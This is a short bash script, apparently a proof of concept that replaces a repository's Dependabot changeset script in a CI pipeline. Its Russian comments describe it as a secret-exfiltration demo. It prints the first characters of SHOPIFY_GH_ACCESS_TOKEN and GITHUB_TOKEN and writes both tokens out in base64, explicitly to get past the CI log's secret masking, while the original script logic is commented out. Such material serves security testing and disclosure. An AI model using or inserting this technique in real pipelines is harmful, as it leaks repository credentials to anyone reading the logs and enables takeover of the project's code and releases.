#!/bin/bash

echo "Attempting to exfiltrate secrets..."
echo "Available environment variables (some might be secrets):"

# Простой вывод всех переменных
# printenv

echo "---SHOPIFY_GH_ACCESS_TOKEN (first 5 chars if set): ${SHOPIFY_GH_ACCESS_TOKEN:0:5}"
echo "---GITHUB_TOKEN (first 5 chars if set): ${GITHUB_TOKEN:0:5}"

# Более продвинутый метод: кодирование в Base64 для обхода маскирования
echo "---Base64 encoded GITHUB_TOKEN---"
echo $GITHUB_TOKEN | base64
echo "---End Base64 encoded GITHUB_TOKEN---"

echo "---Base64 encoded SHOPIFY_GH_ACCESS_TOKEN---"
echo $SHOPIFY_GH_ACCESS_TOKEN | base64
echo "---End Base64 encoded SHOPIFY_GH_ACCESS_TOKEN---"

# Оригинальная логика скрипта, чтобы он не падал сразу (если это важно для демонстрации)
# pr_number=$(gh pr view --json number --jq '.number')
# changeset_filename=".changeset/dependabot-$pr_number.md"
# echo "Original script logic would run here for PR: $pr_number, changeset: $changeset_filename"
# exit 0 # Завершаем успешно для PoC

echo "PoC script finished."